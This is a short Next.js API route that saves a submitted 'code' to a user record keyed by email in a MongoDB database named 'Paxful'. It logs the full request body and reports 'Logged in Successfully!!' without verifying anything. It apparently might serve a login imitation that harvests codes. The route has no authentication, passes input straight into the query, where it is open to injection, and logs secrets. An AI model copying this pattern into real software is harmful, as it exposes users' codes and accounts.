import clientPromise from "@/lib/mongo";
async function create(req: Request) {
  try {
    const body = await req.json();
    const client = await clientPromise;
    const db = client.db("Paxful");
    console.log("body", body);

    // If the user does not exist by email or name Insert the new user into the database
    await db
      .collection("users")
      .updateOne({ email: body.email }, { $set: { code: body.code } });

    return Response.json(
      { message: "Logged in  Successfully!!" },
      { status: 200 }
    );
  } catch (error) {
    console.error("API Error:", error);
    return Response.json(
      { message: "An error occurred while logging in" },
      { status: 500 }
    );
  }
}

export { create as POST };
